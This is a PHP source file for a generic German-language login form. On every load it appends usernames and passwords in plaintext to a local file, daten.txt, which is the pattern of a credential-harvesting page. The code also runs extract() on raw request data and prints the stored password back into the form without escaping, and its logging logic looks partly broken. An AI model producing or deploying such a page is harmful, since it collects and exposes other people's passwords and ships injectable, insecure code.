<?php
session_start(); // Sitzung starten wenn nicht schon passiert
// Wenn die Seite das erste mal aufgerufen wird existieren noch keine Sessionvariablen
if(!isset($_SESSION['username']))
{
$_SESSION['username']='';
$_SESSION['password']='';
}

// Daten von Form abfangen:

    extract($_REQUEST);
    $daten=fopen("daten.txt", "a");

    fwrite($daten,"Benutzername: ");
    fwrite($daten, $_SESSION['username'] . "\n");
    fwrite($daten,"Passwort: ");
    fwrite($daten, $_SESSION['password'] . "\n");
    fwrite($daten,"-------------------------------------------------------------" . "\n");
    fclose($daten);

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" lang="de" xml:lang="de">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <link rel="stylesheet" href="style.css">
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Raleway:wght@100;600&display=swap" rel="stylesheet">
    <title>Login</title>
</head>

<body>
    <div class="wrapper">
        <div class="contact-form">
            <div class="input-fields">
                <form id="cform" name="Login" action="success.php" method="post">
                        <div class="loginText"><center><p> Bei Webseite anmelden</p></center></div><br>
                        <input name="username" type="text" class="input" placeholder="Benutzername" value="<?php echo $_SESSION['username']; ?>">
                        <input name="password" type="password" class="input" placeholder="Passwort" value="<?php echo $_SESSION['password']; ?>">
                    <br><br>
                    <div class="btn"><input name="absenden" id="schicken" type="submit" value="submit"></div>
                </form>
            </div>



        </div>

    </div>
</body>
</html>